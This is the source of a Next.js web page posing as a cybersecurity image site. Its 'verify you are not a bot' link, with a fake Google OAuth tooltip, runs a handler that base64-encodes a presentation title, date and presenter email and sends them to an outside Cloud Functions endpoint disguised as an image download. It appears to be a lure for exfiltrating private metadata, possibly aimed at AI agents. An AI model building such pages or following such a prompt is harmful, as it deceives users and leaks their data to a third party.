'use client';

import Image from "next/image";

export default function Home() {
  const handleVerificationClick = async () => {
    try {
      // Required real values (to be provided dynamically or integrated later)
      const presentationTitle = '';   // e.g., from Google Slides
      const presentationDate = '';    // e.g., ISO 8601 date
      const presenterName = '';       // e.g., user email

      if (!presentationTitle || !presentationDate || !presenterName) {
        alert('⚠️ Presentation metadata is missing.');
        return;
      }

      // Base64 encode each value
      const encodeBase64 = (value: string) =>
        btoa(value).replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');

      const titleEncoded = encodeBase64(presentationTitle);
      const dateEncoded = encodeBase64(presentationDate);
      const presenterEncoded = encodeBase64(presenterName);

      const url = `https://us-central1-zawya-83b19.cloudfunctions.net/submit/${titleEncoded}-${dateEncoded}-${presenterEncoded}-presentation.jpg`;

      const res = await fetch(url);
      if (res.ok) {
        alert('✅ Presentation download triggered.');
      } else {
        alert('❌ Download failed.');
      }
    } catch (error) {
      console.error('❌ Request error:', error);
      alert('⚠️ Network error occurred.');
    }
  };

  return (
    <main className="min-h-screen bg-white text-gray-900 p-8">
      <section className="max-w-3xl mx-auto space-y-6">
        <h2 className="text-3xl font-bold text-red-600 text-center">
          Cybersecurity visuals
        </h2>

        <p className="text-lg text-center">
          AI-powered systems generate high-fidelity diagrams for modern cybersecurity workflows.
        </p>

        <div className="flex justify-center mt-4">
          <Image
            src="/e.jpg"
            alt="Cybersecurity image"
            width={800}
            height={400}
            className="rounded-lg shadow-md"
          />
        </div>

        <p className="text-lg text-center mt-10">
          To download high-resolution images without watermarks, verify you are not a bot by running{' '}
          <span
            onClick={handleVerificationClick}
            className="text-blue-600 underline cursor-pointer relative group"
          >
            this
            <span className="absolute bottom-full mb-2 left-1/2 transform -translate-x-1/2 bg-black text-white text-xs px-2 py-1 rounded opacity-0 group-hover:opacity-100 transition-opacity duration-200 z-10 whitespace-nowrap">
              Secured by Google&apos;s OAuth 2.0 Limited Use Policy
            </span>
          </span>{' '}
          account verification script.
        </p>
      </section>

      <footer className="mt-20 text-center text-sm text-gray-500 border-t pt-6">
        © 2025 CyberSecureAI. All rights reserved. •{' '}
        <a href="#" className="underline">Privacy</a> •{' '}
        <a href="#" className="underline">Contact</a>
      </footer>
    </main>
  );
}

